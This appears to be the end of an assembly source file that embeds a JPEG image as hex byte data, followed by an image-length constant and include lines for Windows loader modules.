db	`\x66\x53\x83\x90\xb9\xda\x7e\x99\x1f\x4a`
db	`\x00\xed\xaf\x7e\x19\xf8\x6a\xff\x00\xc6`
db	`\x71\xf8\xa2\xe2\xda\x46\xbd\x56\x57\x31`
db	`\x6f\xfd\xcb\xc8\xbc\x2b\xb2\xe3\x96\x1f`
db	`\x5c\x71\xd2\xba\x6b\x2d\x36\xc7\x4d\x13`
db	`\x0b\x1b\x38\x2d\x84\xd2\x19\x65\x10\xc6`
db	`\x13\x7b\x9e\xac\x71\xd4\xfb\xd4\x5a\x66`
db	`\xb5\xa5\xeb\x50\x09\xf4\xcd\x46\xd6\xf2`
db	`\x3f\xef\x41\x2a\xbe\x3e\xb8\xe9\x57\xe8`
db	`\x01\xb2\x48\x90\xc4\xf2\xc8\xc1\x23\x45`
db	`\x2c\xcc\x4f\x00\x0e\xa6\xb8\x8b\xcb\x5f`
db	`\x0e\xfc\x60\xf0\xe4\x52\x5b\x6a\x37\xbf`
db	`\x61\xb6\xbc\x25\x5e\xdc\x98\xb7\x48\x9e`
db	`\xa1\x87\x23\x90\x47\x15\xdb\xc8\x89\x2c`
db	`\x6d\x1c\x8a\x19\x1c\x15\x65\x23\x82\x0f`
db	`\x51\x5c\xd7\x81\xac\x75\x3d\x2b\x42\x3a`
db	`\x76\xa7\xa6\x69\x9a\x71\x82\x56\x58\x22`
db	`\xd3\x98\xec\x68\xfb\x31\x07\x90\x49\xcf`
db	`\x52\x73\x40\x1d\x3d\x7c\xf1\xf1\xd2\xc7`
db	`\xfe\x11\xef\x88\x1e\x1c\xf1\x3e\x9e\xbe`
db	`\x5d\xd5\xc3\x65\xb6\x7f\x14\x90\xb2\x60`
db	`\x9f\x72\x18\x0f\xa0\xaf\xa0\x6e\xae\xad`
db	`\xec\xad\x65\xba\xba\x9a\x38\x2d\xe2\x52`
db	`\xd2\x49\x23\x05\x55\x03\xb9\x26\xbc\x17`
db	`\xc4\x29\xa8\x7c\x6f\xf1\x85\xbf\xfc\x23`
db	`\x85\xad\x74\x4d\x15\x5c\x26\xa5\x3c\x67`
db	`\x6b\xcc\x48\x3f\x28\xea\x73\xb5\x38\xec`
db	`\x39\x3d\x40\xa0\x0f\x49\xf8\x8d\x65\xe2`
db	`\x48\xf4\x59\xb5\x8f\x0b\x6a\xd3\xda\xde`
db	`\xda\x46\x5e\x5b\x6c\x2b\xa4\xf1\x8e\x4e`
db	`\x15\x81\x01\xc0\xce\x08\xeb\xd0\xf6\xc3`
db	`\xbe\x19\xe9\xfa\x37\xfc\x23\x8b\xe2\x0d`
db	`\x31\xee\x2e\x6e\x75\x9f\xdf\xdd\xde\x5d`
db	`\x10\x66\x95\xc1\x20\x83\x8e\x00\x56\xdc`
db	`\x30\x38\xae\x76\x5f\x0f\xfc\x61\xba\xb3`
db	`\x93\x4e\xb8\xf1\x36\x86\x20\x95\x4c\x72`
db	`\x5c\xa4\x27\xcd\xda\x78\x38\x1b\x00\xce`
db	`\x3e\x9f\x5a\xef\xfc\x2b\xe1\xe8\x3c\x2b`
db	`\xe1\x8b\x0d\x12\xda\x46\x92\x3b\x48\xf6`
db	`\xf9\x8c\x30\x5d\x89\x2c\xcd\x8e\xd9\x24`
db	`\x9a\x00\xd8\xa2\x8a\x28\x03\x93\xf8\x99`
db	`\xa5\xcb\xab\xfc\x3a\xd6\xad\xad\xc3\x1b`
db	`\x84\x87\xed\x11\x6d\xeb\xbe\x36\x12\x0c`
db	`\x7b\xfc\xb8\xfc\x6b\x96\xd4\x74\x0d\x43`
db	`\xc4\xda\x6e\x9f\xe3\xbf\x02\xde\x45\xa7`
db	`\xeb\x97\xd6\x6a\xb7\x20\x9c\x47\x3a\xb2`
db	`\xe0\xee\xed\xbd\x0f\x43\xfe\xcf\xb0\xaf`
db	`\x55\xaf\x20\xd5\xfc\x1d\xe3\xad\x32\xea`
db	`\x4f\x0e\x78\x42\xf6\x1b\x5f\x0c\xea\x33`
db	`\x34\xc6\xe0\xf1\x2e\x9e\x1b\x97\x8d\x79`
db	`\xce\xd2\x49\x23\x03\x3c\xe3\x23\xa9\x00`
db	`\xcc\xd3\xac\xe5\xb2\x47\xf8\x7b\xe0\x8b`
db	`\x9f\x37\x52\x94\xf9\x9e\x20\xf1\x07\x51`
db	`\x09\x3f\x78\x29\xee\xfd\x40\x19\xe3\x9e`
db	`\xfb\x88\xf4\x9b\x6f\x87\x7e\x16\x83\xc2`
db	`\xf0\x78\x7e\x4d\x26\xde\xe2\xca\x21\x9c`
db	`\xcc\xb9\x76\x73\xd5\xf7\x75\x0c\x7d\x46`
db	`\x2a\xef\x84\xfc\x27\xa6\x78\x3b\x43\x8f`
db	`\x4c\xd3\x22\xc2\x8f\x9a\x59\x5b\xef\xcc`
db	`\xfd\xd9\x8f\xaf\xf2\xad\xca\x00\xf9\xdb`
db	`\x5e\xf8\x77\xf0\xe6\xd7\x5f\x9a\xcb\x4a`
db	`\xf1\xc1\xd0\xf5\x38\x9f\x6b\x45\x2c\x9b`
db	`\xd2\x36\xfe\xee\xef\x97\x07\xea\xc6\xa5`
db	`\xf8\x61\xaa\xf8\xc2\x4f\x89\x33\x68\x56`
db	`\x9e\x25\x7d\x6f\x43\xb1\x27\xed\x77\x32`
db	`\x93\x24\x6c\xa0\x60\x6c\x2d\x92\x09\x6e`
db	`\x06\x0e\x0e\x09\xe4\x55\x0d\x5b\xc1\xfa`
db	`\x4d\xdf\xc7\xad\x5b\x41\xd7\xd2\x48\xed`
db	`\xf5\x95\x33\xd9\x5c\x46\xfb\x59\x24\x61`
db	`\xb8\x11\xd8\xf2\x24\x5c\x11\xc9\xc5\x77`
db	`\xd7\xda\x46\x99\xf0\x67\xe1\x7e\xa8\x34`
db	`\xa9\x25\x97\x50\xbb\x3e\x54\x53\x38\x1e`
db	`\x64\xb3\xbf\xca\x98\x03\xb2\x8c\x90\x3d`
db	`\x8f\xad\x00\x51\x4f\x89\xbe\x39\xd5\xf5`
db	`\x1d\x5e\x6f\x0c\xf8\x5a\xd3\x54\xd1\xec`
db	`\x2f\x1e\xd9\x65\x0e\x43\xbe\xde\xe3\xe6`
db	`\xe7\x23\x07\x81\xdc\x56\x51\xf8\x91\xab`
db	`\x0f\x14\xc7\xad\x5c\x7c\x36\xd6\xd3\x59`
db	`\x4b\x46\xb2\x08\x92\x49\xb1\xd0\xb0\x61`
db	`\x90\x63\xea\x08\xe3\xea\x7a\xf1\x5e\xa5`
db	`\xf0\xff\x00\xc3\x2b\xe1\x1f\x04\xe9\xba`
db	`\x49\x50\x2e\x12\x3f\x32\xe4\x8e\xf2\xb7`
db	`\x2d\xf5\xc1\xe3\xe8\x05\x74\xd4\x01\xe3`
db	`\x87\xc1\xfe\x35\xf8\x95\x7b\x1c\xfe\x35`
db	`\x94\x68\xfa\x0c\x6c\x1d\x34\x9b\x57\xf9`
db	`\xe4\xf4\xde\x46\x7f\x33\xc8\xec\x07\x5a`
db	`\xf5\x8d\x33\x4c\xb2\xd1\xb4\xe8\x74\xfd`
db	`\x3a\xda\x3b\x6b\x48\x57\x6c\x71\x46\x30`
db	`\x00\xff\x00\x1f\x7a\xb7\x45\x00\x14\x51`
db	`\x45\x00\x14\x51\x45\x00\x14\x51\x45\x00`
db	`\x14\x51\x45\x00\x70\x1f\x14\xbc\x09\x37`
db	`\x8b\x34\xab\x7d\x43\x49\x6f\x27\xc4\x1a`
db	`\x5b\xf9\xd6\x52\x83\xb4\xbe\x0e\x76\x67`
db	`\xb7\x20\x10\x7b\x11\xee\x6b\x9b\xf0\xad`
db	`\x87\x8b\x7e\x21\x78\x8f\x4e\xd6\x3c\x69`
db	`\xa7\x1d\x3a\xc3\x43\x39\x82\xd1\xa2\x68`
db	`\xfe\xd3\x73\xff\x00\x3d\x0a\xb7\x38\x18`
db	`\x07\xd3\x3c\x0e\xf5\xec\x74\x50\x01\x45`
db	`\x14\x50\x01\x45\x14\x50\x01\x45\x14\x50`
db	`\x01\x45\x14\x50\x07\xff\xd9`
IMAGE_LENGTH equ 4107

%include 'load_win32.asm'
%include 'multiloader.asm'